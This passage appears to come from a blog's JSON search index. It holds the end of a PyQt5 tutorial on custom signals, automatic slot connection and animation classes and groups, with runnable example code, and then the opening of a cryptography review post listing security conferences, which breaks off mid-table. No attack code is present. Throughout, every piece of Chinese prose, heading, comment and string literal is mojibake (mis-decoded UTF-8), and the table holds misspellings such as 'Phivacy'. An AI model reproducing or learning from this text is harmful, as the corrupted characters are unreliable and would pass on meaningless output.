#å‘å°„å‚æ•°æ˜¯intçš„ä¿¡å·\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"ä¿¡å·çš„å­¦ä¹ \")\n        self.resize(400,400)\n        self.set_ui()\n    def set_ui(self):\n        btn = Btn(\"æˆ‘æ˜¯æŒ‰é’®\",self)\n        btn.right_clicked.connect(lambda arg:print(\"å³é”®è¢«ç‚¹å‡»äº†\",arg))\n        # btn.right_clicked[int,str].connect(lambda v1,arg :print(\"å³é”®è¢«ç‚¹å‡»äº†\",v1,arg))\n        # btn.right_clicked[int].connect(lambda val:print(val))\n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n## è£…é¥°å™¨è‡ªåŠ¨è¿æ¥ä¿¡å·ä¸æ§½\n\n- QtCore.QMetaObject.connectSlotsByName(obj)  å°†objå†…éƒ¨çš„å­å­™å¯¹è±¡çš„ä¿¡å·, æŒ‰ç…§å…¶objectNameè¿æ¥åˆ°ç›¸å…³çš„æ§½å‡½æ•° \n- ä¸€å®šè¦ç­‰åˆ°selfä¸­çš„å¯¹è±¡åˆ›å»ºå®Œæˆï¼Œå› æ­¤è¯­å¥æ”¾åœ¨æœ€åé¢ï¼ŒPyUICä¼šè‡ªåŠ¨ç”Ÿæˆ\n\nä½¿ç”¨è§„åˆ™ï¼š\n\n```python\n@pyqtSlot()\ndef on_objectName_ä¿¡å·å(self):  # åå­—æ˜¯ on_$ObjectName$_$Singnal$\n    pass\n```\n\nç¤ºä¾‹ï¼š\n\n```python\nfrom PyQt5 import QtCore\nfrom PyQt5.Qt import *  \nimport sys\n\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"è£…é¥°å™¨è¿æ¥ä¿¡å·å’Œæ§½çš„å­¦ä¹ \")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        btn = QPushButton(\"æµ‹è¯•æŒ‰é’®\", self)\n        btn.resize(200, 200)\n        btn.move(100, 100)\n        btn.setObjectName(\"btn\")\n        QtCore.QMetaObject.connectSlotsByName(self)  # å®ƒä¸€å®šè¦ç­‰åˆ°selfä¸­çš„å¯¹è±¡åˆ›å»ºå®Œæˆ\n\n    @pyqtSlot()\n    def on_btn_clicked(self):  # åå­—æ˜¯ on_$ObjectName$_$Signal$\n        print(\"æŒ‰é’®è¢«ç‚¹å‡»äº†\")\n        \n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n# åŠ¨ç”»æ•ˆæœ\n\n## åŠ¨ç”»ç±»ç»§æ‰¿ç»“æ„å›¾\n\n![](https://img.jwt1399.top//img/20210812150357.png)\n\n## QAbstractAnimation\n\n> æ‰€æœ‰åŠ¨ç”»å…±äº«çš„åŠŸèƒ½ï¼Œç»§æ‰¿æ­¤ç±», å®ç°ä¸€äº›è‡ªå®šä¹‰åŠ¨ç”»\t\n\n### å¾ªç¯æ“ä½œ\n\n- setLoopCount(int loopCount) è®¾ç½®åŠ¨ç”»å¾ªç¯æ¬¡æ•°\n- loopCount() -> int             è·å–å¾ªç¯æ¬¡æ•°\n- currentLoop() -> int          åŠ¨ç”»çš„å½“å‰å¾ªç¯æ¬¡æ•°ï¼Œä»0å¼€å§‹\n- currentLoopTime() -> int  å½“å‰å¾ªç¯æ¬¡æ•°å†…çš„æ—¶é—´\n\n### æ—¶é—´æ“ä½œ\n\n- duration() -> int          å•æ¬¡æ—¶é•¿\n- totalDuration() -> int  åŠ¨ç”»æ€»æ—¶é•¿\n- currentTime() -> int    å½“å‰åŠ¨ç”»è¿è¡Œæ—¶é•¿\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"åŠ¨ç”»çš„å­¦ä¹ \")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        btn = QPushButton(\"æŒ‰é’®\", self)\n        btn.resize(200, 200)\n        btn.move(100, 100)\n        btn.setStyleSheet(\"background-color:cyan;\")\n\n        # 1, åˆ›å»ºä¸€ä¸ªåŠ¨ç”»å¯¹è±¡ ï¼Œå¹¶ä¸”è®¾ç½®ç›®æ ‡å±æ€§\n        animation = QPropertyAnimation(btn, b\"pos\", self)\n\n        # 2ï¼Œè®¾ç½®å±æ€§å€¼  åŒ…æ‹¬ å¼€å§‹å€¼ ï¼ˆæ’å€¼ï¼‰ ç»“æŸå€¼\n        animation.setStartValue(QPoint(0, 0))\n        animation.setKeyValueAt(0.5, QPoint(0, 200))  # åœ¨åŠ¨ç”»æ—¶é•¿çš„ä¸­é—´è¦æ’å€¼\n        animation.setEndValue(QPoint(200, 200))\n\n        # 3ï¼ŒåŠ¨ç”»æ—¶é•¿\n        animation.setDuration(2000)  # 2s\n\n        # 4ï¼Œå¯åŠ¨åŠ¨ç”»\n        animation.start()\n        animation.setLoopCount(3)  # å¾ªç¯ä¸‰é\n\n        #æ—¶é—´æ“ä½œ\n        print(\"å¾ªç¯æ¬¡æ•°:\", animation.loopCount())\n        print(\"å•æ¬¡æ—¶é•¿:\", animation.duration(), \"æ€»æ—¶é•¿:\", animation.totalDuration())\n        btn.clicked.connect(lambda: print(\"å½“å‰å¾ªç¯æ¬¡æ•°:\", animation.currentLoop(),\"å½“å‰å¾ªç¯æ¬¡å†…çš„æ—¶é•¿:\", animation.currentLoopTime(), \"å½“å‰åŠ¨ç”»è¿è¡Œæ—¶é•¿:\", animation.currentTime()))\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n    \"\"\"\n    å¾ªç¯æ¬¡æ•°: 3\n    å•æ¬¡æ—¶é•¿: 2000 æ€»æ—¶é•¿: 6000\n    å½“å‰å¾ªç¯æ¬¡æ•°: 0 å½“å‰å¾ªç¯æ¬¡å†…çš„æ—¶é•¿: 1456 å½“å‰åŠ¨ç”»è¿è¡Œæ—¶é•¿: 1456\n    å½“å‰å¾ªç¯æ¬¡æ•°: 1 å½“å‰å¾ªç¯æ¬¡å†…çš„æ—¶é•¿: 1296 å½“å‰åŠ¨ç”»è¿è¡Œæ—¶é•¿: 3296\n    å½“å‰å¾ªç¯æ¬¡æ•°: 2 å½“å‰å¾ªç¯æ¬¡å†…çš„æ—¶é•¿: 1328 å½“å‰åŠ¨ç”»è¿è¡Œæ—¶é•¿: 5328\n    \"\"\"\n```\n\n### åŠ¨ç”»æ–¹å‘\n\n- setDirection(QAbstractAnimation.Direction)\n  - å‚æ•°(QAbstractAnimation.Direction)ï¼š                          \n  - QAbstractAnimation.Forward     `0`    åŠ¨ç”»çš„å½“å‰æ—¶é—´éšç€æ—¶é—´è€Œå¢åŠ ï¼ˆå³ï¼Œä»0ç§»åŠ¨åˆ°ç»“æŸ/æŒç»­æ—¶é—´ï¼‰\n  - QAbstractAnimation.Backward  `1`    åŠ¨ç”»çš„å½“å‰æ—¶é—´éšç€æ—¶é—´è€Œå‡å°‘ï¼ˆå³ï¼Œä»ç»“æŸ/æŒç»­æ—¶é—´å‘0ç§»åŠ¨ï¼‰\n- direction() -> QAbstractAnimation.Direction   \n\n```python\n# åŠ¨ç”»æ–¹å‘è®¾ç½®ä¸€å®šè¦åœ¨å¯åŠ¨åŠ¨ç”»ä¹‹å‰\nanimation.setDirection(QAbstractAnimation.Backward)\nprint(\"åŠ¨ç”»æ–¹å‘ï¼š\",animation.direction())\n```\n\n### åŠ¨ç”»çŠ¶æ€\n\n- state() -> QAbstractAnimation.State\n  - å‚æ•°(QAbstractAnimation.State)ï¼š\n  - QAbstractAnimation.Stopped  `0`    åœæ­¢ \n  - QAbstractAnimation.Paused    `1`    æš‚åœ \n  - QAbstractAnimation.Running  `2`    è¿è¡Œ\n\næ¡ˆä¾‹ï¼šå½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®çš„æ—¶å€™ï¼ŒåŠ¨ç”»åœæ­¢ï¼Œå†æ¬¡ç‚¹å‡»æ—¶åŠ¨ç”»ç»§ç»­ã€‚\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"åŠ¨ç”»çš„å­¦ä¹ \")\n        self.resize(400,400)\n        self.set_ui()\n\n\n    def set_ui(self):\n        btn = QPushButton(\"æŒ‰é’®\",self)\n        btn.resize(200,200)\n        btn.move(100,100)\n        btn.setStyleSheet(\"background-color:cyan;\")\n\n        #1, åˆ›å»ºä¸€ä¸ªåŠ¨ç”»å¯¹è±¡ ï¼Œå¹¶ä¸”è®¾ç½®ç›®æ ‡å±æ€§\n        animation = QPropertyAnimation(btn,b\"pos\",self)\n\n        #2ï¼Œè®¾ç½®å±æ€§å€¼  åŒ…æ‹¬ å¼€å§‹å€¼ ï¼ˆæ’å€¼ï¼‰ ç»“æŸå€¼\n        animation.setStartValue(QPoint(0,0))\n        animation.setKeyValueAt(0.5,QPoint(0,200))  #åœ¨åŠ¨ç”»æ—¶é•¿çš„ä¸­é—´è¦æ’å€¼\n        animation.setEndValue(QPoint(200,200))\n\n        #3ï¼ŒåŠ¨ç”»æ—¶é•¿\n        animation.setDuration(2000)   #2s\n\n        #è¿™é‡Œé€šè¿‡åŠ¨ç”»æ›²çº¿ï¼Œæ”¹å˜åŠ¨ç”»èŠ‚å¥ï¼š\n        animation.setEasingCurve(QEasingCurve.InOutBounce)\n\n        animation.setLoopCount(3)  # å¾ªç¯ä¸‰é\n\n\n        #åŠ¨ç”»æ–¹å‘è®¾ç½®ä¸€å®šè¦åœ¨ å¯åŠ¨åŠ¨ç”»ä¹‹å‰\n        animation.setDirection(QAbstractAnimation.Backward)\n\n\n        #4ï¼Œå¯åŠ¨åŠ¨ç”»\n        animation.start()\n\n\n        def btn_clicked_slot():\n            if animation.state() == QAbstractAnimation.Running:\n                animation.pause()\n            elif animation.state() == QAbstractAnimation.Paused:\n                animation.resume()\n\n        btn.clicked.connect(btn_clicked_slot)\n\n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n### å¸¸ç”¨æ“ä½œ\n\n- start(QAbstractAnimation.DeletionPolicy)\n  - å‚æ•°(QAbstractAnimation.DeletionPolicy)ï¼š\n  - QAbstractAnimation.KeepWhenStopped   åœæ­¢æ—¶ä¸ä¼šåˆ é™¤åŠ¨ç”»ã€‚\n  - QAbstractAnimation.DeleteWhenStopped åœæ­¢æ—¶åŠ¨ç”»å°†è‡ªåŠ¨åˆ é™¤ã€‚\n- pause()     åŠ¨ç”»æš‚åœ\n- stop()        åŠ¨ç”»åœæ­¢\n  - stop() å’Œpause() çš„åŒºåˆ«ï¼šå®ƒä»¬éƒ½å¯ä»¥åœæ­¢è¿è¡Œã€‚stop() æ˜¯ä¸å¯æ¢å¤çš„ï¼Œpause() æ˜¯å¯ä»¥æ¢å¤çš„\n\n- resume()  åŠ¨ç”»æ¢å¤\n\n- setCurrentTime(int)  è®¾ç½®å½“å‰æ—¶é—´\n- setPause(bool)  è®¾ç½®æ˜¯å¦æš‚åœ\n\n### å¸¸ç”¨ä¿¡å·\n\n-  currentLoopChanged(int currentLoop)   å¾ªç¯æ”¹å˜è§¦å‘\n- directionChanged(QAbstractAnimation.Direction newDirection)   åŠ¨ç”»æ–¹å‘æ”¹å˜è§¦å‘\n- finished()  åŠ¨ç”»å®Œæˆæ—¶è§¦å‘\n- stateChanged(QAbstractAnimation.State newState, QAbstractAnimation.State oldState)   åŠ¨ç”»çŠ¶æ€æ”¹å˜è§¦å‘ï¼ˆè¿”å›ä¸¤ä¸ªå‚æ•°ï¼Œæ–°çŠ¶æ€å’Œè€çŠ¶æ€ï¼‰\n\n##  QVariantAnimation\n\n### è®¾ç½®æ—¶é•¿\n\n- setDuration(int msecs)\n\n### å¼€å§‹å’Œç»“æŸå€¼\n\n- setStartValue(QVariant value)\n- startValue() -> QVariant\n- setEndValue(QVariant value)\n- endValue() -> QVariant\n\n### å…³é”®å€¼\n\n- setKeyValueAt(double step, QVariant value)\n- keyValueAt(double step) -> QVariant\n- setKeyValues(QVariantAnimation.KeyValues keyValues)\n- keyValues() -> QVariantAnimation.KeyValues\n\n### åŠ¨ç”»æ›²çº¿\n\n- setEasingCurve(self, Union[QEasingCurve, QEasingCurve.Type])\n- easingCurve() -> Union[QEasingCurve, QEasingCurve.Type]\n- QEasingCurveå–å€¼ï¼š https://doc.qt.io/qt-5/qeasingcurve.html#Type-enum\n\n\n\n## QPropertyAnimation\n\n> ç”¨äºå®ç°æŸä¸ªå±æ€§å€¼ä»xåˆ°yçš„åŠ¨ç”»å˜åŒ–\n\n### æ„é€ åŠ¨ç”»å¯¹è±¡å¹¶è®¾ç½®ç›®æ ‡å±æ€§\n\næ–¹å¼1\n\n- QPropertyAnimation(parent: QObject = None)\n- setTargetObject(self, QObject)\n- targetObject(self)\n- setPropertyName(self, Union[QByteArray, bytes, bytearray])\n- propertyName(self) -> QByteArray\n\n```python\nanimation = QPropertyAnimation(self)\nanimation.setTargetObject(btn)  #å¯¹ btn åšåŠ¨ç”»\nanimation.setPropertyName(b\"pos\")  #å¯¹btn çš„ pos å±æ€§åšåŠ¨ç”»\n```\n\næ–¹å¼2\n\n- QPropertyAnimation(QObject, Union[QByteArray, bytes, bytearray], parent: QObject = None)\n\n```python\nanimation = QPropertyAnimation(btn, b\"pos\", self)\n```\n\nå¸¸ç”¨å±æ€§\n\n- geometry ä½ç½®å’Œå°ºå¯¸\n- pos  ä½ç½®\n- size  å°ºå¯¸\n- windowOpacity  é€æ˜åº¦\n\n```python\n#å¯¹ä½ç½®åšåŠ¨ç”»\nanimation = QPropertyAnimation(btn,b\"pos\",self)\nanimation.setStartValue(QPoint(0,0))\nanimation.setEndValue(QPoint(300,300))\n\n#å¯¹å°ºå¯¸åšåŠ¨ç”»\nanimation = QPropertyAnimation(btn,b\"size\",self)\nanimation.setStartValue(QSize(0,0))\nanimation.setEndValue(QSize(300,300))\n\n#å¯¹ä½ç½®å’Œå°ºå¯¸åŒæ—¶åšåŠ¨ç”»\nanimation = QPropertyAnimation(btn,b\"geometry\",self)\nanimation.setStartValue(QRect(0,0,100,100))\nanimation.setEndValue(QRect(200,200,300,300))\n\n#å¯¹é€æ˜åº¦åšåŠ¨ç”»\nanimation = QPropertyAnimation(self,b\"windowOpacity\",self)\nanimation.setStartValue(1)\nanimation.setEndValue(0.5)\n```\n\n### è®¾ç½®å¼€å§‹å€¼å’Œç»“æŸå€¼\n\n- setStartValue(self, Any)  å¼€å§‹\n- setEndValue(self, Any)    ç»“æŸ\n- setKeyValueAt(self, float, Any)  å¼€å§‹å’Œç»“æŸä¹‹é—´\n- setKeyValues(self, object)\n\n```python\nanimation.setStartValue(QSize(0,0))\nanimation.setKeyValueAt(0.5,QPoint(0,200))  #åœ¨åŠ¨ç”»æ—¶é•¿çš„ä¸­é—´è¦æ’å€¼\nanimation.setEndValue(QSize(200,200))\n```\n\n### è®¾ç½®åŠ¨ç”»æ—¶é•¿\n\n- setDuration(int mesc)\n\n```python\nanimation.setDuration(2000)   #2s\n```\n\n### è®¾ç½®åŠ¨ç”»æ›²çº¿\n\n- setEasingCurve(self, Union[QEasingCurve, QEasingCurve.Type])\n- QEasingCurveå–å€¼ï¼šhttps://doc.qt.io/qt-5/qeasingcurve.html#Type-enum\n\n```python\n#è¿™é‡Œé€šè¿‡åŠ¨ç”»æ›²çº¿ï¼Œæ”¹å˜åŠ¨ç”»èŠ‚å¥ï¼š\nanimation.setEasingCurve(QEasingCurve.InOutBounce)\n```\n\n### å¯åŠ¨åŠ¨ç”»\n\n- start(QAbstractAnimation.DeletionPolicy)\n  - å‚æ•°(QAbstractAnimation.DeletionPolicy)ï¼š\n  - QAbstractAnimation.KeepWhenStopped   åœæ­¢æ—¶ä¸ä¼šåˆ é™¤åŠ¨ç”»ã€‚\n  - QAbstractAnimation.DeleteWhenStopped åœæ­¢æ—¶åŠ¨ç”»å°†è‡ªåŠ¨åˆ é™¤ã€‚\n\n```python\n#å¯åŠ¨åŠ¨ç”»\nanimation.start()\n```\n\n### å®Œæ•´åŠ¨ç”»ç¤ºä¾‹\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"åŠ¨ç”»çš„å­¦ä¹ \")\n        self.resize(400,400)\n        self.set_ui()\n\n\n    def set_ui(self):\n        btn = QPushButton(\"æŒ‰é’®\",self)\n        btn.resize(200,200)\n        btn.move(100,100)\n        btn.setStyleSheet(\"background-color:cyan;\")\n\n        #1, åˆ›å»ºä¸€ä¸ªåŠ¨ç”»å¯¹è±¡ ï¼Œå¹¶ä¸”è®¾ç½®ç›®æ ‡å±æ€§\n        animation = QPropertyAnimation(btn,b\"pos\",self)  #å¯ä¸€èµ·å†™ï¼Œå¯¹è±¡ï¼Œå±æ€§\n        # animation.setTargetObject(btn)  #å¯¹ btn åšåŠ¨ç”»\n        # animation.setPropertyName(b\"pos\")  #å¯¹btn çš„ pos å±æ€§åšåŠ¨ç”»\n\n\n        #2ï¼Œè®¾ç½®å±æ€§å€¼  åŒ…æ‹¬ å¼€å§‹å€¼ ï¼ˆæ’å€¼ï¼‰ ç»“æŸå€¼\n        animation.setStartValue(QPoint(0,0))\n        animation.setKeyValueAt(0.5,QPoint(0,200))  #åœ¨åŠ¨ç”»æ—¶é•¿çš„ä¸­é—´è¦æ’å€¼\n        animation.setEndValue(QPoint(200,200))\n\n        #3ï¼ŒåŠ¨ç”»æ—¶é•¿\n        animation.setDuration(2000)   #2s\n\n        #è¿™é‡Œé€šè¿‡åŠ¨ç”»æ›²çº¿ï¼Œæ”¹å˜åŠ¨ç”»èŠ‚å¥ï¼š\n        animation.setEasingCurve(QEasingCurve.InOutBounce)\n\n\n        #4ï¼Œå¯åŠ¨åŠ¨ç”»\n        animation.start()\n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n\n    window = Window()\n    window.show()\n\n    sys.exit(app.exec_())\n```\n\n## QPauseAnimation\n\n> æš‚åœåŠ¨ç”», åœ¨ä¸²è¡ŒåŠ¨ç”»ä¸­ä½¿ç”¨\t\n\n- setDuration(int msecs) è®¾ç½®æš‚åœæ—¶é•¿\n\n\n\n# åŠ¨ç”»ç»„\n\n## QAnimationGroup\n\n> å¯ä»¥å°†ä¸€ç»„åŠ¨ç”», åŒæ—¶æ’­æ”¾æˆ–è€…æŒ‰é¡ºåºæ’­æ”¾\n\næ·»åŠ åŠ¨ç”»\n\n- addAnimation(QAbstractAnimation animation)\n- insertAnimation(int index, QAbstractAnimation animation)\n\nç§»é™¤åŠ¨ç”»\n\n- removeAnimation(QAbstractAnimation animation)\n\nè·å–åŠ¨ç”»\n\n- animationAt(int index) -> QAbstractAnimation\n\nè·å–å¹¶ç§»é™¤\n\n- takeAnimation(int index) -> QAbstractAnimation\n\nåŠ¨ç”»ä¸ªæ•°\n\n- animationCount() -> int\n\næ¸…ç©ºåŠ¨ç”»\n\n- clear()\n\n## QParallelAnimationGroup\n\n> å¹¶è¡ŒåŠ¨ç”»ï¼Œå¤šä¸ªåŠ¨ç”»åŒæ—¶æ‰§è¡Œ\n\n- åŠŸèƒ½å‚ç…§çˆ¶ç±»\n- åªæ˜¯æ·»åŠ çš„æ‰€æœ‰åŠ¨ç”», éƒ½æ˜¯åŒæ—¶æ‰§è¡Œ\n\n## QSequentialAnimationGroup\n\n> ä¸²è¡ŒåŠ¨ç”»ï¼Œå¤šä¸ªåŠ¨ç”»å…ˆåæ‰§è¡Œ\n\n- åŠŸèƒ½å‚ç…§çˆ¶ç±»\n- åªæ˜¯æ·»åŠ çš„æ‰€æœ‰åŠ¨ç”», éƒ½æ˜¯ä¸²è¡Œé¡ºåºæ‰§è¡Œ\n\n- addPause(int msecs) -> QPauseAnimation    è®¾ç½®ç¬¬ä¸€ä¸ªåŠ¨ç”»æ‰§è¡Œå®Œåæš‚åœæ—¶é—´\n- insertPause(int index, int msecs) -> QPauseAnimation\n- currentAnimation() -> QAbstractAnimation\n\n- ä¿¡å·ï¼šcurrentAnimationChanged(QAbstractAnimation current)\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"åŠ¨ç”»ç»„çš„å­¦ä¹ \")\n        self.resize(800,800)\n        self.set_ui()\n\n    def set_ui(self):\n        red_btn = QPushButton(\"çº¢è‰²æŒ‰é’®\",self)\n        green_btn = QPushButton(\"ç»¿è‰²æŒ‰é’®\",self)\n        red_btn.resize(100,100)\n        green_btn.resize(100,100)\n        green_btn.move(150,150)\n        red_btn.setStyleSheet(\"background-color:red;\")\n        green_btn.setStyleSheet(\"background-color:green;\")\n\n        #åŠ¨ç”»è®¾ç½®\n        animation_green = QPropertyAnimation(green_btn,b\"pos\",self)\n        animation_green.setKeyValueAt(0,QPoint(150,150))\n        animation_green.setKeyValueAt(0.25,QPoint(550,150))\n        animation_green.setKeyValueAt(0.5,QPoint(550,550))\n        animation_green.setKeyValueAt(0.75,QPoint(150,550))\n        animation_green.setKeyValueAt(1,QPoint(150,150))\n        animation_green.setDuration(2000)\n        #animation_green.start()  # åŠ¨ç”»ä¸æ˜¯é˜»å¡çš„ï¼ŒåŠ¨ç”»è¿è¡Œæ—¶ä¼šç»§ç»­å¾€ä¸‹è¿è¡Œ\n        ###########################################################\n        animation_red = QPropertyAnimation(red_btn,b\"pos\",self)\n        animation_red.setKeyValueAt(0,QPoint(0,0))\n        animation_red.setKeyValueAt(0.25,QPoint(0,700))\n        animation_red.setKeyValueAt(0.5,QPoint(700,700))\n        animation_red.setKeyValueAt(0.75,QPoint(700,0))\n        animation_red.setKeyValueAt(1,QPoint(0,0))\n        animation_red.setDuration(2000)\n        #animation_red.start()\n\n        #ç”¨ä¸²è¡ŒåŠ¨ç”»ç»„æ¥ç®¡ç†ä¸Šé¢ä¸¤ä¸ªåŠ¨ç”»\n        animation_group  = QSequentialAnimationGroup(self)\n        animation_group.addAnimation(animation_red)\n        animation_group.addAnimation(animation_green)\n        animation_group.start()\n        \n        #ç”¨å¹¶è¡ŒåŠ¨ç”»ç»„æ¥ç®¡ç†ä¸Šé¢ä¸¤ä¸ªåŠ¨ç”»\n        # animation_group  = QParallelAnimationGroup(self)\n        # animation_group.addAnimation(animation_red)\n        # animation_group.addAnimation(animation_green)\n        # animation_group.start()\n        \n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\næ¡ˆä¾‹ï¼šç¬¬ä¸€ä¸ªåŠ¨ç”»æ‰§è¡Œæ‰§è¡Œå®Œ 5s ä¹‹åå†æ‰§è¡Œç¬¬äºŒä¸ª\n\næ–¹æ³•ä¸€ï¼šä½¿ç”¨addPause\n\n```python\n#ç”¨åŠ¨ç”»ç»„æ¥ç®¡ç†ä¸Šé¢ä¸¤ä¸ªåŠ¨ç”»\nanimation_group  = QSequentialAnimationGroup(self)\nanimation_group.addAnimation(animation_red)\n#############################è®¾ç½®æš‚åœæ—¶é•¿##############################\nanimation_group.addPause(5000)  # åªæœ‰ä¸²è¡Œä¸­æ‰ä¼šæœ‰è¿™ä¸ªè®¾ç½®  æš‚åœ5s\n#############################è®¾ç½®æš‚åœæ—¶é•¿##############################\nanimation_group.addAnimation(animation_green)\nanimation_group.start()\n```\n\næ–¹æ³•äºŒï¼šä½¿ç”¨QPauseAnimation\n\n```python\n#ç”¨åŠ¨ç”»ç»„æ¥ç®¡ç†ä¸Šé¢ä¸¤ä¸ªåŠ¨ç”»\nanimation_group  = QSequentialAnimationGroup(self)\nanimation_group.addAnimation(animation_red)\n#############################è®¾ç½®æš‚åœæ—¶é•¿##############################\npause_animation = QPauseAnimation()\npause_animation.setDuration(5000)\nanimation_group.addAnimation(pause_animation)\n#############################è®¾ç½®æš‚åœæ—¶é•¿##############################\nanimation_group.addAnimation(animation_green)\nanimation_group.start()\n\n```\n\n#  ç»¼åˆæ¡ˆä¾‹\n\n358\n\næ³¨ï¼šæ ‡é¢˜åå« \"*\" å·ï¼Œè¯´æ˜è¯¥å†…å®¹è¿˜æœªå†™å®Œï¼Œegï¼šâ€œ`äº‹ä»¶*`â€\n\n# å¼€æºé¡¹ç›®æ”¶é›†\n\n- [Qt-Material](https://qt-material.readthedocs.io/en/latest/index.html#qt-material)ï¼šPySide6ã€PySide2å’ŒPyQt5çš„ Material Design é£æ ¼æ ·å¼è¡¨\n- [QDarkStyleSheet](https://github.com/ColinDuquesnoy/QDarkStyleSheet) ï¼š ä¸€ä¸ªé»‘æš—é£æ ¼çš„æ ·å¼è¡¨\n- [PyQt5_stylesheets ](https://github.com/RedFalsh/PyQt5_stylesheets)ï¼šPyQt5 é£æ ¼æ ·å¼è¡¨\n- [CustomWidgets](https://github.com/PyQt5/CustomWidgets)ï¼šPyQt Custom Widgets - PyQt è‡ªå®šä¹‰æ§ä»¶ \n- [PyQt Examples](https://github.com/PyQt5/PyQt)ï¼šPyQtå„ç§æµ‹è¯•å’Œä¾‹å­\n- [3rd-Apps](https://github.com/PyQt5/3rd-Apps)ï¼šCollecting 3rd Apps \n\n# èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["PyQt"],"categories":["Python"]},{"title":"Cryptography Review","url":"/posts/37412.html","content":"\nåˆæ¬¡æ¥è§¦å¯†ç å­¦æ˜¯åœ¨å¤§äºŒçš„<<ç°ä»£å¯†ç å­¦>>è¯¾å ‚ä¸Šï¼Œå½¼æ—¶ä»…å¯¹ç†è®ºåŸºç¡€è¿›è¡Œäº†å­¦ä¹ ï¼Œåæ¥å‚åŠ CTFæ¯”èµ›ï¼Œä¸ºäº†è§£ç­”å…¶ä¸­ Crypto æ¨¡å—ï¼Œå°†è¯¾å ‚å­¦åˆ°çš„çŸ¥è¯†è¿ç”¨äº†èµ·æ¥ï¼Œä½†æ€»çš„æ¥è¯´ç ”ç©¶å¹¶ä¸æ·±ï¼ŒåŠ ä¹‹è¿‘æ®µæ—¶é—´æ²¡æœ‰å†ç¢°è¿‡äº†ï¼Œæ•…æ­¤æœ‰äº†å†™æ­¤æ–‡çš„æƒ³æ³•ï¼Œä¸€æ˜¯ä¸ºäº†è‡ªå·±å¤ä¹ ï¼ŒäºŒæ˜¯ä¸ºäº†æ­¤åˆ»æ­£åœ¨çœ‹æ–‡ç« çš„ä½ æä¾›ä¸€ç‚¹å‚è€ƒã€‚\n\n## ä¼šè®®å’ŒæœŸåˆŠ\n\n###  å¯†ç å­¦ä¸‰å¤§é¡¶ä¼š\n\n| ç¼–å· | ä¼šè®®ç®€ç§°  | ä¼šè®®åç§°                                                     | å‡ºç‰ˆç¤¾   | ä¼šè®®ç½‘å€                             |\n| ---- | --------- | ------------------------------------------------------------ | -------- | ------------------------------------ |\n| 1    | Crypto    | International Cryptology Conference                          | Springer | https://iacr.org/meetings/crypto/    |\n| 2    | Eurocrypt | European Cryptology Conference                               | Springer | https://iacr.org/meetings/eurocrypt/ |\n| 3    | Asiacrypt | Annual International Conferenceon the Theory and Application ofã€€Cryptology and Informationã€€Security | Springer | https://iacr.org/meetings/asiacrypt/ |\n\n###  ä¿¡æ¯å®‰å…¨å››å¤§é¡¶ä¼š\n\n| ç¼–å· | ä¼šè®®ç®€ç§°        | ä¼šè®®åç§°                                               | å‡ºç‰ˆç¤¾             | ä¼šè®®ç½‘å€                              |\n| ---- | --------------- | ------------------------------------------------------ | ------------------ | ------------------------------------- |\n| 1    | CCS             | ACM Conference on Computer and Communications Security | ACM                | http://dblp.uni-trier.de/db/conf/ccs/ |\n| 2    | S&P             | IEEE Symposium on Security and Phivacy                 | IEEE               | http://dblp.uni-trier.de/db/conf/sp/  |\n| 3    | Usenix Security | Usenix Security Symposium                              | USENIX Association | http://dblp.uni-trier.de/db/conf/uss/ |\n| 4    | NDSS            | ISOC Network and Disthibuted System SecuritySyumposium | ISOC               | https://www.ndss-symposium.org/       |\n\n### è®¡ç®—æœºç±»ä¸‰å¤§æƒå¨åˆŠç‰©\n\n| ç¼–å· | åç§°             | ä¸»åŠå•ä½                                 | ç½‘å€                                            |\n| ---- | ---------------- | ---------------------------------------- | ----------------------------------------------- |\n| 1    | è½¯ä»¶å­¦æŠ¥         | 